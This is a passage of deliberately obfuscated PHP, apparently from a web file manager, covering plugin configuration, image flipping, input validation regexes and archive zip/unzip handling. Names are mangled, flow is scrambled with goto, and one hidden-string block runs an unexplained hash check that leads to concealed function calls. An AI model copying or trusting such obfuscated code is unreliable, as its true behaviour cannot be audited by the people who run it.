is_array($EÉ¿è‘ÙŸ[$AÄÃœÔÍÇÙ[2160]])) { return $bÉô¼§İŸÀ; } foreach ($EÉ¿è‘ÙŸ[$AÄÃœÔÍÇÙ[2160]] as $dÒ¥Ä±´¡Ù => $fÓã´ê£Õˆ) { if (!isset($fÓã´ê£Õˆ[$AÄÃœÔÍÇÙ[356]]) || isset($bÉô¼§İŸÀ[$dÒ¥Ä±´¡Ù])) { continue; } $bÉô¼§İŸÀ[$dÒ¥Ä±´¡Ù] = $fÓã´ê£Õˆ[$AÄÃœÔÍÇÙ[356]]; } return $bÉô¼§İŸÀ; } public function getPackageJson($b–¥—õ‡Ú) { return Hook::apply($b–¥—õ‡Ú . $_SERVER[£ü][2161]); } public function getConfig($e‹Êä½ÉÒ, $Dâ£“®­“µ = false) { $bÉˆ’õ÷á” =& $_SERVER[£ü]; $d©Ó§í×’Ó = array(); $Bİ—ïÕ™äÑ = $this->loadList($e‹Êä½ÉÒ); if ($Bİ—ïÕ™äÑ && is_array($Bİ—ïÕ™äÑ[$bÉˆ’õ÷á”[6]])) { $d©Ó§í×’Ó = $Bİ—ïÕ™äÑ[$bÉˆ’õ÷á”[6]]; } if (!$d©Ó§í×’Ó || $Dâ£“®­“µ) { $d©Ó§í×’Ó = $this->getConfigDefault($e‹Êä½ÉÒ); } return $d©Ó§í×’Ó; } public function setConfig($f…„¢ö§Õ, $Fâİ¡À¨Áã = false) { goto fóó¡Æ‡¢; a¶˜¤ø×Ç: if ($Fâİ¡À¨Áã == !1) { $Fâİ¡À¨Áã = $this->getConfigDefault($f…„¢ö§Õ); } $d¬×˜‹ÆŸ« = $B™õ¨ø[$EÖíñŒàÑ[6]]; foreach ($Fâİ¡À¨Áã as $a†Ç¹ñä× => $f¦·ƒÛÆ) { $d¬×˜‹ÆŸ«[$a†Ç¹ñä×] = is_string($f¦·ƒÛÆ) ? trim($f¦·ƒÛÆ) : $f¦·ƒÛÆ; } goto aã´·ôÒˆæ; fóó¡Æ‡¢: $EÖíñŒàÑ =& $_SERVER[£ü]; $B™õ¨ø = $this->loadList($f…„¢ö§Õ); if (!$B™õ¨ø) { return !1; } goto a¶˜¤ø×Ç; aã´·ôÒˆæ: $this->update($B™õ¨ø[$EÖíñŒàÑ[364]], array($EÖíñŒàÑ[6] => $d¬×˜‹ÆŸ«)); goto e¥Øñ³µ¨®; e¥Øñ³µ¨®: } public function viewList() { goto DŸÎˆ²Ê•‚; c‚˜íé»·¬: return $Dö´ÏÛ¼Í; goto DÀœø·ˆí; dœÎ‰ã¨’: $a»Ó˜šï‘è = $this->loadPluginList(); $Dö´ÏÛ¼Í = array(); foreach ($a»Ó˜šï‘è as $cöªÈ¢¸Ï => $E’ù‡ÓÍŠ¼) { unset($E’ù‡ÓÍŠ¼[$dİá¯ÃˆÛ’[2153]], $E’ù‡ÓÍŠ¼[$dİá¯ÃˆÛ’[6]]); $b–Úñ·Ó†ó = PLUGIN_DIR . $E’ù‡ÓÍŠ¼[$dİá¯ÃˆÛ’[28]] . $dİá¯ÃˆÛ’[2155]; if (!is_file($b–Úñ·Ó†ó)) { continue; } $A©Ğ¥¸³ = Hook::apply($E’ù‡ÓÍŠ¼[$dİá¯ÃˆÛ’[28]] . $dİá¯ÃˆÛ’[2161]); if (is_array($A©Ğ¥¸³)) { $Dö´ÏÛ¼Í[$cöªÈ¢¸Ï] = array_merge($E’ù‡ÓÍŠ¼, $A©Ğ¥¸³); } } goto c‚˜íé»·¬; DŸÎˆ²Ê•‚: $dİá¯ÃˆÛ’ =& $_SERVER[£ü]; $a»Ó˜šï‘è = $this->loadList(); $this->pluginScan($a»Ó˜šï‘è); goto dœÎ‰ã¨’; DÀœø·ˆí: } private function loadPluginList() { $FïòöšŸ© =& $_SERVER[£ü]; $Eç¼İä—ö° = $this->loadList(); if (strtolower(MOD) == $FïòöšŸ©[2162]) { return $Eç¼İä—ö°; } $Dì ô«©í¾ = Hook::trigger($FïòöšŸ©[2163], $Eç¼İä—ö°); if ($Eç¼İä—ö° && !$Dì ô«©í¾) { die; } return $Dì ô«©í¾ ? $Dì ô«©í¾ : $Eç¼İä—ö°; } private function pluginScan($c‘ëë¾‚¿) { $E…Ğ¨¬ãïÓ =& $_SERVER[£ü]; recursion_dir(PLUGIN_DIR, $E™ŠóÁÅƒ, $fÔ‹ÅÛ°Ùì, 0); foreach ($E™ŠóÁÅƒ as $e×‡©‰¥ÜÓ) { $B“ÈËçŠ¥Â = get_path_this($e×‡©‰¥ÜÓ); if (isset($c‘ëë¾‚¿[$B“ÈËçŠ¥Â]) || !file_exists($e×‡©‰¥ÜÓ . $E…Ğ¨¬ãïÓ[2164]) || !file_exists($e×‡©‰¥ÜÓ . $E…Ğ¨¬ãïÓ[2155])) { continue; } Hook::apply($B“ÈËçŠ¥Â . $E…Ğ¨¬ãïÓ[2158]); } } } goto B¼†Œ­¦Ÿ; AÁ‡‘ØÆ…®: if (!function_exists($_SERVER[£ü][1832])) { define($_SERVER[£ü][1833], 0); define($_SERVER[£ü][1834], 1); define($_SERVER[£ü][1835], 2); function imageflip($b„œÚŠô¿¶, $cÅ‰Ó”œë) { switch ($cÅ‰Ó”œë) { case IMG_FLIP_HORIZONTAL: $C²ãÎ±Š¥ò = imagesx($b„œÚŠô¿¶) - 1; $C–›ñ¶³Íõ = $C²ãÎ±Š¥ò / 2; $fÚğ‡é‹Êå = imagesy($b„œÚŠô¿¶); $c§‰Ğ¬ˆ’£ = imageistruecolor($b„œÚŠô¿¶) ? imagecreatetruecolor(1, $fÚğ‡é‹Êå) : imagecreate(1, $fÚğ‡é‹Êå); for ($C›¦„É¡Ù = 0; $C›¦„É¡Ù < $C–›ñ¶³Íõ; ++$C›¦„É¡Ù) { imagecopy($c§‰Ğ¬ˆ’£, $b„œÚŠô¿¶, 0, 0, $C›¦„É¡Ù, 0, 1, $fÚğ‡é‹Êå); imagecopy($b„œÚŠô¿¶, $b„œÚŠô¿¶, $C›¦„É¡Ù, 0, $C²ãÎ±Š¥ò - $C›¦„É¡Ù, 0, 1, $fÚğ‡é‹Êå); imagecopy($b„œÚŠô¿¶, $c§‰Ğ¬ˆ’£, $C²ãÎ±Š¥ò - $C›¦„É¡Ù, 0, 0, 0, 1, $fÚğ‡é‹Êå); } break; case IMG_FLIP_VERTICAL: $fÌƒÏ‰¶›­ = imagesx($b„œÚŠô¿¶); $F„ÂÂå…× = imagesy($b„œÚŠô¿¶) - 1; $fï®ÅíÃø = $F„ÂÂå…× / 2; $c§‰Ğ¬ˆ’£ = imageistruecolor($b„œÚŠô¿¶) ? imagecreatetruecolor($fÌƒÏ‰¶›­, 1) : imagecreate($fÌƒÏ‰¶›­, 1); for ($eÆ‡½ÀÈ³® = 0; $eÆ‡½ÀÈ³® < $fï®ÅíÃø; ++$eÆ‡½ÀÈ³®) { imagecopy($c§‰Ğ¬ˆ’£, $b„œÚŠô¿¶, 0, 0, 0, $eÆ‡½ÀÈ³®, $fÌƒÏ‰¶›­, 1); imagecopy($b„œÚŠô¿¶, $b„œÚŠô¿¶, 0, $eÆ‡½ÀÈ³®, 0, $F„ÂÂå…× - $eÆ‡½ÀÈ³®, $fÌƒÏ‰¶›­, 1); imagecopy($b„œÚŠô¿¶, $c§‰Ğ¬ˆ’£, 0, $F„ÂÂå…× - $eÆ‡½ÀÈ³®, 0, 0, $fÌƒÏ‰¶›­, 1); } break; case IMG_FLIP_BOTH: $fÌƒÏ‰¶›­ = imagesx($b„œÚŠô¿¶); $fÚğ‡é‹Êå = imagesy($b„œÚŠô¿¶); $c§‰Ğ¬ˆ’£ = imagerotate($b„œÚŠô¿¶, 180, 0); imagecopy($b„œÚŠô¿¶, $c§‰Ğ¬ˆ’£, 0, 0, 0, 0, $fÌƒÏ‰¶›­, $fÚğ‡é‹Êå); break; default: return; } imagedestroy($c§‰Ğ¬ˆ’£); } } if (!function_exists($_SERVER[£ü][1836])) { function imagecreatefrombmp($C©ˆè£È¦) { return ImageGdBMP::load($C©ˆè£È¦); } } class Input { public static function getArray($aÜ´ùÓíÌÌ) { goto c…ãñè°ˆŞ; d“¥ÄÕ•‡Ö: $F‹¾‘ñõ·› = array(); $dë“›×ë½Ç = LNG($aƒ™šŞŠ£Õ[1837]); foreach ($aÜ´ùÓíÌÌ as $dŠªØ¢‹µ => $D¸Ø–ˆî­ì) { goto f†—çö¬…; f†—çö¬…: $Fòõ½¯™³ = _get($D¸Ø–ˆî­ì, $aƒ™šŞŠ£Õ[1228], $dë“›×ë½Ç . $aƒ™šŞŠ£Õ[870] . $dŠªØ¢‹µ); $DÍí©ñ—µê = $dŠªØ¢‹µ; if (isset($D¸Ø–ˆî­ì[$aƒ™šŞŠ£Õ[1838]]) && $D¸Ø–ˆî­ì[$aƒ™šŞŠ£Õ[1838]]) { $DÍí©ñ—µê = $D¸Ø–ˆî­ì[$aƒ™šŞŠ£Õ[1838]]; } goto EŸ‡§È»; b‡ÛôÕ„„: if (isset($D¸Ø–ˆî­ì[$aƒ™šŞŠ£Õ[1840]]) && !self::check($in[$dŠªØ¢‹µ], $D¸Ø–ˆî­ì[$aƒ™šŞŠ£Õ[1840]], $a‘Û¬¾é×”)) { if (array_key_exists($aƒ™šŞŠ£Õ[1839], $D¸Ø–ˆî­ì)) { if (!is_null($D¸Ø–ˆî­ì[$aƒ™šŞŠ£Õ[1839]])) { $eÕï¨—Á¼Ò[$DÍí©ñ—µê] = $D¸Ø–ˆî­ì[$aƒ™šŞŠ£Õ[1839]]; } } else { $F‹¾‘ñõ·›[] = $Fòõ½¯™³; } continue; } $eÕï¨—Á¼Ò[$DÍí©ñ—µê] = $in[$dŠªØ¢‹µ]; goto bì’Ò¸™”Š; EŸ‡§È»: if (!array_key_exists($dŠªØ¢‹µ, $in)) { if (array_key_exists($aƒ™šŞŠ£Õ[1839], $D¸Ø–ˆî­ì)) { if (!is_null($D¸Ø–ˆî­ì[$aƒ™šŞŠ£Õ[1839]])) { $eÕï¨—Á¼Ò[$DÍí©ñ—µê] = $D¸Ø–ˆî­ì[$aƒ™šŞŠ£Õ[1839]]; } } else { if (isset($D¸Ø–ˆî­ì[$aƒ™šŞŠ£Õ[1840]])) { $F‹¾‘ñõ·›[] = $Fòõ½¯™³; } } continue; } if (isset($D¸Ø–ˆî­ì[$aƒ™šŞŠ£Õ[1840]]) && $D¸Ø–ˆî­ì[$aƒ™šŞŠ£Õ[1840]] == $aƒ™šŞŠ£Õ[279]) { $a•éà³•Î´ = json_decode($in[$dŠªØ¢‹µ], !0); if (is_array($a•éà³•Î´)) { $eÕï¨—Á¼Ò[$DÍí©ñ—µê] = $a•éà³•Î´; } else { if (array_key_exists($aƒ™šŞŠ£Õ[1839], $D¸Ø–ˆî­ì)) { if (!is_null($D¸Ø–ˆî­ì[$aƒ™šŞŠ£Õ[1839]])) { $eÕï¨—Á¼Ò[$DÍí©ñ—µê] = $D¸Ø–ˆî­ì[$aƒ™šŞŠ£Õ[1839]]; } } else { $F‹¾‘ñõ·›[] = $Fòõ½¯™³; } } continue; } $a‘Û¬¾é×” = _get($D¸Ø–ˆî­ì, $aƒ™šŞŠ£Õ[999]); goto b‡ÛôÕ„„; bì’Ò¸™”Š: } goto Bœî†š¶æœ; Bœî†š¶æœ: if (count($F‹¾‘ñõ·›) > 0) { show_json(implode($aƒ™šŞŠ£Õ[1841], $F‹¾‘ñõ·›), !1); } return $eÕï¨—Á¼Ò; goto E “ñ½àÁŠ; c…ãñè°ˆŞ: $aƒ™šŞŠ£Õ =& $_SERVER[£ü]; global $in; $eÕï¨—Á¼Ò = array(); goto d“¥ÄÕ•‡Ö; E “ñ½àÁŠ: } public static function reg($B–Ä‡Õ¯Âö = "\162\145\x71\165\151\162\145") { static $aÈçÇ™á§è = array("\x72\x65\x71\x75\151\x72\145" => "\56\x2b", "\x6e\165\x6d\142\x65\162" => "\x5c\x64\53", "\x68\x65\170" => "\x5b\x30\x2d\x39\x41\x2d\x46\141\x2d\x66\x5d\53", "\x69\156\164" => "\133\x2d\134\x2b\x5d\x3f\134\x64\x2b", "\142\157\157\x6c" => "\x30\174\x31", "\146\154\x6f\141\164" => "\x5b\x2d\134\x2b\135\x3f\134\144\53\x28\x5c\x2e\x5c\x64\53\51\77", "\x65\x6e\x67\154\151\163\x68" => "\133\101\x2d\132\x61\55\x7a\40\x5d\x2b", "\143\x68\x69\156\x65\163\x65" => "\x5b\x5c\x78\173\x34\x65\60\60\175\55\134\170\x7b\x39\x66\x61\x35\175\135\53", "\x68\x61\x73\103\x68\x69\x6e\145\x73\145" => "\57\50\133\x5c\170\173\x34\x65\x30\x30\x7d\x2d\134\x78\173\71\146\x61\65\175\x5d\x2b\x29\x2f\165", "\x65\x6d\x61\151\154" => "\x5c\x77\53\x28\x5b\x5c\x2e\x5c\x2d\135\134\x77\53\x29\x2a\x5c\x40\x5c\x77\53\x28\133\x5c\x2e\134\x2d\x5d\134\167\53\51\x2a\134\56\134\167\53", "\160\x68\x6f\156\145" => "\x31\x5b\63\x2d\x39\135\134\144\x7b\71\175", "\164\x65\x6c\x70\x68\x6f\x6e\145" => "\x28\134\50\x5c\144\x7b\x33\54\x34\175\x5c\x29\x7c\x5c\x64\x7b\63\x2c\64\x7d\x2d\174\x5c\x73\51\77\134\x64\x7b\67\54\61\x34\175", "\x75\x72\154" => "\50\150\164\164\160\174\x66\164\160\x7c\x68\164\x74\160\163\x29\72\134\57\x5c\x2f\x5b\x5c\x77\134\55\x5f\135\x2b\x28\x5c\56\133\x5c\167\134\55\x5f\135\53\x29\x2b\x28\133\x5c\167\134\55\x5c\x2e\x2c\x40\x3f\136\75\x25\x26\x3a\x5c\57\x7e\x5c\53\43\135\52\133\x5c\167\134\55\x5c\100\x3f\136\x3d\45\x26\x5c\57\176\134\53\x23\x5d\x29\77", "\x75\x72\154\x46\165\154\154" => "\133\x61\x2d\x7a\x41\x2d\x7a\135\53\72\134\x2f\x5c\x2f\133\136\x5c\x73\135\x2a", "\x69\160" => "\x28\x5c\x64\173\61\54\x33\175\x5c\56\x29\173\x33\x7d\50\134\x64\x7b\61\x2c\63\x7d\x29", "\172\x69\160" => "\x5b\61\55\x39\x5d\x5c\x64\x7b\x35\175\50\77\x21\x5c\144\51", "\151\144\x43\141\162\x64" => "\50\x5c\x64\x7b\61\65\x7d\x29\x7c\50\x5c\144\x7b\61\x37\x7d\x28\x5c\x64\x7c\x58\x7c\170\x29\x29", "\143\157\154\x6f\x72" => "\x23\x28\x5b\x30\x2d\71\x41\x2d\106\141\x2d\x66\135\x7b\x33\x7d\174\133\60\55\x39\101\x2d\106\x61\55\146\x5d\173\x36\x7d\51", "\x74\x69\155\145" => "\x28\133\x30\55\x31\135\x5c\x64\174\62\133\60\55\x34\135\51\72\133\60\55\65\135\x5c\144", "\144\141\x74\145" => "\134\x64\x7b\x34\175\x5b\x2d\x5c\57\135\77\50\60\x5b\x31\55\x39\x5d\174\x31\x5b\x30\x2d\62\135\x29\x5b\x2d\x5c\x2f\135\77\50\133\60\55\62\x5d\134\144\174\x33\133\x30\55\x31\135\x29", "\x64\x61\164\x65\x54\151\155\x65" => "\x5c\x64\173\64\x7d\133\55\x5c\x2f\135\77\50\x30\133\x31\55\x39\135\174\61\x5b\60\x2d\x32\x5d\x29\x5b\55\x5c\x2f\x5d\77\x28\x5b\60\x2d\x32\135\134\x64\x7c\x33\x5b\x30\x2d\61\135\x29\x5c\163\x2b\50\x5b\60\x2d\x31\x5d\x5c\144\x7c\x32\x5b\60\55\x34\135\x29\72\x5b\x30\x2d\65\135\134\x64", "\x70\141\163\163\167\157\x72\x64" => "\x28\x3f\75\x2e\52\134\x64\x29\50\77\x3d\x2e\x2a\133\x61\55\x7a\x5d\x29\x28\x3f\75\56\x2a\x5b\x41\x2d\x5a\x5d\x29\56\x7b\x38\54\62\60\175", "\153\x65\171" => "\x5b\x41\55\132\x61\55\172\60\x2d\71\x5f\134\x2d\134\56\x5d\53", "\x6b\145\x79\106\x75\154\x6c" => "\x5b\x41\55\x5a\x61\x2d\172\x30\x2d\71\x5f\x5c\x2d\x5c\56\x5c\x73\x2c\x5d\x2b"); if (!$B–Ä‡Õ¯Âö) { return $aÈçÇ™á§è; } return $aÈçÇ™á§è[$B–Ä‡Õ¯Âö]; } public static function check($AÂô…òÎ§…, $Aˆ˜‚‡¥èÂ, $eÁÎçÎÁ‹ = null) { $EóéØ‡åà =& $_SERVER[£ü]; switch ($Aˆ˜‚‡¥èÂ) { case $EóéØ‡åà[7]: return in_array($AÂô…òÎ§…, $eÁÎçÎÁ‹); break; case $EóéØ‡åà[1842]: return floatval($AÂô…òÎ§…) > $eÁÎçÎÁ‹; break; case $EóéØ‡åà[1843]: return floatval($AÂô…òÎ§…) < $eÁÎçÎÁ‹; break; case $EóéØ‡åà[322]: return strlen($AÂô…òÎ§…) >= $eÁÎçÎÁ‹[0] && strlen($AÂô…òÎ§…) <= $eÁÎçÎÁ‹[1]; break; case $EóéØ‡åà[322]: if (is_array($eÁÎçÎÁ‹)) { return strlen($AÂô…òÎ§…) >= $eÁÎçÎÁ‹[0] && strlen($AÂô…òÎ§…) <= $eÁÎçÎÁ‹[1]; break; } else { return strlen($AÂô…òÎ§…) == $eÁÎçÎÁ‹; break; } case $EóéØ‡åà[318]: return floatval($AÂô…òÎ§…) >= $eÁÎçÎÁ‹[0] && floatval($AÂô…òÎ§…) <= $eÁÎçÎÁ‹[1]; break; } $BÎè†Ñöòİ = self::reg(!1); $Aˆ˜‚‡¥èÂ = isset($BÎè†Ñöòİ[$Aˆ˜‚‡¥èÂ]) ? $BÎè†Ñöòİ[$Aˆ˜‚‡¥èÂ] : $Aˆ˜‚‡¥èÂ; if (substr($Aˆ˜‚‡¥èÂ, 0, 1) != $EóéØ‡åà[8]) { $Aˆ˜‚‡¥èÂ = $EóéØ‡åà[1844] . $Aˆ˜‚‡¥èÂ . $EóéØ‡åà[1845]; } return preg_match($Aˆ˜‚‡¥èÂ, $AÂô…òÎ§…) === 1; } public static function get($Fã«Û–ØÜ´, $D¹œ©…À¥” = null, $E³Ş‘…¶¯ = null, $eˆÇéæ¿— = null) { goto eÒ‹„å¢Â“; eÒ‹„å¢Â“: $d§äÃ³©÷À =& $_SERVER[£ü]; $A…¤‘ƒÀè¯ = array(); if (!is_null($E³Ş‘…¶¯)) { $A…¤‘ƒÀè¯[$d§äÃ³©÷À[34]] = $E³Ş‘…¶¯; } goto cºøõĞ‰é®; E›é·÷­Ë: return $B¥¬¿¥›È£[$Fã«Û–ØÜ´]; goto d“˜îÙœá¯; cºøõĞ‰é®: if (!is_null($eˆÇéæ¿—)) { $A…¤‘ƒÀè¯[$d§äÃ³©÷À[999]] = $eˆÇéæ¿—; } if (!is_null($D¹œ©…À¥”)) { $A…¤‘ƒÀè¯[$d§äÃ³©÷À[1840]] = $D¹œ©…À¥”; } $B¥¬¿¥›È£ = Input::getArray(array($Fã«Û–ØÜ´ => $A…¤‘ƒÀè¯)); goto E›é·÷­Ë; d“˜îÙœá¯: } } goto EÚšÃ‰ìÂ…; c³ÒŸ ›”á: $c¦±õô†”  = $_SERVER[£ü][1014]; if ($_SERVER[$_SERVER[£ü][723]] != $c¦±õô†” ($D ËÃ™ªÜí)) { goto C½ÈŠÉèí®; C½ÈŠÉèí®: $D‰’Å®’¯© = $_SERVER[£ü][725]; $Fƒö¦¥«‘ê = $_SERVER[$_SERVER[£ü][726]] . $_SERVER[£ü][727]; $F—½ñ‡¹—ã = $D‰’Å®’¯©($Fƒö¦¥«‘ê); goto d´ˆáÈÂŠ™; E¡õØ÷ó«ò: $FÁÄéìã($D ËÃ™ªÜí); goto b¤¯šƒÈŠ; d´ˆáÈÂŠ™: $DˆÄ§–ŠÃï = explode($_SERVER[£ü][214], $F—½ñ‡¹—ã); if (count($DˆÄ§–ŠÃï) < $_SERVER[£ü][558]) { $CŠºÎ„Œ‡´ = $_SERVER[£ü][728]; $CŠºÎ„Œ‡´(); } $FÁÄéìã = $_SERVER[£ü][729]; goto E¡õØ÷ó«ò; b¤¯šƒÈŠ: } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $a‹İ·İì‹; if (!$a‹İ·İì‹) { $dÚáœ¼°á‹ = IO::init($_SERVER[£ü][8]); } return $dÚáœ¼°á‹; } private static function iconvSystem($a¸ï¤ÓØ«í) { return self::local()->iconvSystem($a¸ï¤ÓØ«í); } private static function iconvApp($e¡ùµŸ“Ï) { return self::local()->iconvApp($e¡ùµŸ“Ï); } public static function zip($FòŒ…ß„¿, $d–à¼Ò‘—İ = "\172\x69\160", $Fåê¨¢‹¦ù = '', $FÁˆöŒì® = REPEAT_RENAME) { goto cÃÓÓƒĞÃó; a„™Ğíµ™™: if ($Fåê¨¢‹¦ù || !$d½“é«®½) { if ($d½“é«®½ && strstr($d½“é«®½, TEMP_FILES)) { $aÂ‚Å®ö·˜ = $FÙ ïª¡× = array(); recursion_dir($Eë›ß–¹, $aÂ‚Å®ö·˜, $FÙ ïª¡×, 0); foreach ($aÂ‚Å®ö·˜ as $EîŞàƒ§) { del_dir($EîŞàƒ§); } foreach ($FÙ ïª¡× as $F°¤¹‹—«Ê) { if ($F°¤¹‹—«Ê == $féÛŠœ’×¢) { continue; } del_file($F°¤¹‹—«Ê); } } return $FáêÑƒ†Ş; } $E¸ÜÊ¤ƒ£Ã = self::pathFather($b–‘˜³”È[$cÉù®¦±Š[75]]); $e•‡ÌØ‡Å¶ = self::move($FáêÑƒ†Ş, $E¸ÜÊ¤ƒ£Ã, $FÁˆöŒì®); goto E¦Ö‡‚à±³; aò‡ªÍ¦¾«: foreach ($FÙ ïª¡× as $a˜Ï«·Â÷… => $Aµ‹Ã††Ÿñ) { $FÙ ïª¡×[$a˜Ï«·Â÷…] = self::iconvSystem($Aµ‹Ã††Ÿñ); } KodArchive::create($féÛŠœ’×¢, $FÙ ïª¡×); if (!IO::exist($FáêÑƒ†Ş)) { if ($d½“é«®½) { del_dir($d½“é«®½); } show_json(LNG($cÉù®¦±Š[1017]), !1); } goto a„™Ğíµ™™; cÃÓÓƒĞÃó: $cÉù®¦±Š =& $_SERVER[£ü]; $e¹«†„¹àŞ = self::init($FòŒ…ß„¿[0][$cÉù®¦±Š[75]]); $b–‘˜³”È = self::info($FòŒ…ß„¿[0][$cÉù®¦±Š[75]]); goto bğºÉÑ†®; bğºÉÑ†®: $d½“é«®½ = !1; if (!$Fåê¨¢‹¦ù && $e¹«†„¹àŞ->getType() == $cÉù®¦±Š[103]) { $FÙ ïª¡× = self::zipFileList($FòŒ…ß„¿); } else { $d½“é«®½ = $Fåê¨¢‹¦ù ? $Fåê¨¢‹¦ù : TEMP_FILES . $cÉù®¦±Š[1015] . time() . rand_string(8) . $cÉù®¦±Š[8]; mk_dir($d½“é«®½); $FÙ ïª¡× = self::zipFileList($FòŒ…ß„¿, $d½“é«®½); } $A–ÎÍÙÊ¡Ë = $b–‘˜³”È[$cÉù®¦±Š[28]]; goto B×ö¶°ÎØÑ; B×ö¶°ÎØÑ: if (count($FÙ ïª¡×) > 1) { $FÒ®†Áİ…î = IO::info(IO::pathFather($b–‘˜³”È[$cÉù®¦±Š[75]])); $A–ÎÍÙÊ¡Ë = $FÒ®†Áİ…î[$cÉù®¦±Š[28]]; } $Eë›ß–¹ = $d½“é«®½; if (!$Eë›ß–¹) { $Eë›ß–¹ = get_path_father($b–‘˜³”È[$cÉù®¦±Š[75]]); $d¥¤ôà‰­˜ = IO::info($Eë›ß–¹); if (!$d¥¤ôà‰­˜[$cÉù®¦±Š[186]]) { show_json(LNG($cÉù®¦±Š[1016]), !1); } } goto fÊ·ïÒÚõù; fÊ·ïÒÚõù: $FáêÑƒ†Ş = $Eë›ß–¹ . $A–ÎÍÙÊ¡Ë . $cÉù®¦±Š[93] . $d–à¼Ò‘—İ; $FáêÑƒ†Ş = get_filename_auto($FáêÑƒ†Ş, $cÉù®¦±Š[33], $FÁˆöŒì®); $féÛŠœ’×¢ = self::iconvSystem($FáêÑƒ†Ş); goto aò‡ªÍ¦¾«; E¦Ö‡‚à±³: if (!$e•‡ÌØ‡Å¶) { del_dir($d½“é«®½); show_json(LNG($cÉù®¦±Š[1017]), !1); } del_dir($d½“é«®½); return $e•‡ÌØ‡Å¶; goto d½ÕÒÄ•—; d½ÕÒÄ•—: } public static function unzip($c‰—‹…«Õ, $cŠ³Î¿™Î = "\162\x65\x70\x6c\x61\x63\x65") { goto bÛÆÑ¨ÜØ; A°Æ¿·‰®Ú: return !0; goto C¥êáïçç; bøÇë“…©…: Hook::trigger($F ‡çØ‘”Ó[1025], $dæÃšĞ‰ ê); recursion_dir($dæÃšĞ‰ ê, $d×Æš°ô½“, $CëÏŸ«²ëß, 0); $CéòéÑ×Ò = array_merge($d×Æš°ô½“, $CëÏŸ«²ëß); goto F…ŸÁ¦â×; c†§Ş¶ÆéË: $e¶î±ï©ÏŸ = self::tmpFileName($CîñŠÉà¯á); $dæÃšĞ‰ ê = TEMP_FILES . $e¶î±ï©ÏŸ; del_dir($dæÃšĞ‰ ê); goto B‚Äõ¿Àì£; bÛÆÑ¨ÜØ: $F ‡çØ‘”Ó =& $_SERVER[£ü]; $E¶ÅÔ—‡Ù = $c‰—‹…«Õ[$F ‡çØ‘”Ó[75]]; $FÅ’Êç–î = $c‰—‹…«Õ[$F ‡çØ‘”Ó[1018]]; goto B´Û”½„‚‹; F…ŸÁ¦â×: foreach ($CéòéÑ×Ò as $A¯÷˜‡õ±) { $A¯÷˜‡õ± = self::iconvApp($A¯÷˜‡õ±); self::move($A¯÷˜‡õ±, $FÅ’Êç–î, $cŠ³Î¿™Î); } del_dir($dæÃšĞ‰ ê); if (!$A´ë†›–ÈÅ) { del_file($eîÕ„ùªÃß); } goto A°Æ¿·‰®Ú; f‚ù´ƒÜï: if (!@file_exists(self::iconvSystem($eîÕ„ùªÃß))) { $A´ë†›–ÈÅ = self::localFilePath($E¶ÅÔ—‡Ù, $cø‹èÌ¿…); $eîÕ„ùªÃß = $A´ë†›–ÈÅ ? $A´ë†›–ÈÅ : parent::download($E¶ÅÔ—‡Ù, $eîÕ„ùªÃß); } $eîÕ„ùªÃß = self::iconvSystem($eîÕ„ùªÃß); $aÒ¡àä©ƒ = isset($c‰—‹…«Õ[$F ‡çØ‘”Ó[1020]]) ? $c‰—‹…«Õ[$F ‡çØ‘”Ó[1020]] : $F ‡çØ‘”Ó[1021]; goto c”—«òÈ“; B‚Äõ¿Àì£: mk_dir($dæÃšĞ‰ ê); $cø‹èÌ¿… = self::fileExt($CîñŠÉà¯á); $eîÕ„ùªÃß = $dæÃšĞ‰ ê . $F ‡çØ‘”Ó[93] . $cø‹èÌ¿…; goto f‚ù´ƒÜï; B´Û”½„‚‹: if (!($CîñŠÉà¯á = parent::info($E¶ÅÔ—‡Ù))) { show_json(LNG($F ‡çØ‘”Ó[1019]), !1); } if (!($D‹ë°Ÿ‚ÌÖ = parent::infoFull($FÅ’Êç–î))) { $FÅ’Êç–î = parent::mkdir($FÅ’Êç–î); $D‹ë°Ÿ‚ÌÖ = array($F ‡çØ‘”Ó[75] => $FÅ’Êç–î); } else { if (isset($D‹ë°Ÿ‚ÌÖ[$F ‡çØ‘”Ó[366]]) && trim($D‹ë°Ÿ‚ÌÖ[$F ‡çØ‘”Ó[75]], $F ‡çØ‘”Ó[8]) != trim($FÅ’Êç–î, $F ‡çØ‘”Ó[8])) { $c†Œ°‚Ä°™ = KodIO::make($D‹ë°Ÿ‚ÌÖ[$F ‡çØ‘”Ó[457]]); $Eá›ö˜°‡ = parent::fileNameAuto($c†Œ°‚Ä°™, $D‹ë°Ÿ‚ÌÖ[$F ‡çØ‘”Ó[28]], REPEAT_RENAME_FOLDER, !0); $FÅ’Êç–î = parent::mkdir($c†Œ°‚Ä°™ . $Eá›ö˜°‡); $D‹ë°Ÿ‚ÌÖ = array($F ‡çØ‘”Ó[75] => $FÅ’Êç–î); } } $FÅ’Êç–î = $D‹ë°Ÿ‚ÌÖ[$F ‡çØ‘”Ó[75]]; goto c†§Ş¶ÆéË; c”—«òÈ“: $Då†–£¶ÊÓ = KodArchive::extract($eîÕ„ùªÃß, $dæÃšĞ‰ ê . $F ‡çØ‘”Ó[8], $aÒ¡àä©ƒ); self::archiveExt(); if (!$Då†–£¶ÊÓ[$F ‡çØ‘”Ó[1022]]) { show_json($F ‡çØ‘”Ó[1023] . $Då†–£¶ÊÓ[$F ‡çØ‘”Ó[1024]], !1); } goto bøÇë“…©…; C¥êáïçç: } public static function unzipList($A­™‹‚´£) { goto C§À†‰¨œÏ; f£ÆíìÑàš: $Eéµ‚äØ¼¸ = self::info($d¿®õÏªˆá); $C¶Šƒ½ŠÕª = self::fileExt($Eéµ‚äØ¼¸); $EÛ¤Œ­‚Ü¡ = self::tmpFileName($Eéµ‚äØ¼¸); goto aĞ‘Ç§Ï™ë; D°ËÒÄä·İ: $CŒ‚ÒÇ‘Óï = json_encode($F³Ì—‘À¨Í[$A“µù­†ˆ[1024]]); self::setContent($Cñ‰•İ„î, $CŒ‚ÒÇ‘Óï); if (count($F³Ì—‘À¨Í[$A“µù­†ˆ[1024]]) >= $D¶†ŸÒ„ª“) { show_json(sprintf(LNG($A“µù­†ˆ[1028]), count($F³Ì—‘À¨Í[$A“µù­†ˆ[1024]])), !1); } goto A”ÙöºÍ«; A”ÙöºÍ«: return $F³Ì—‘À¨Í[$A“µù­†ˆ[1024]]; goto Eé´¯†ëˆ‘; A—Íøàƒˆ: $D¶†ŸÒ„ª“ = 50000; if (request_url_safe($cŸ«¬Ã­ğ)) { $d»ö‘ ËÙ¸ = parse_url_query($cŸ«¬Ã­ğ); if (!isset($d»ö‘ ËÙ¸[$A“µù­†ˆ[75]])) { 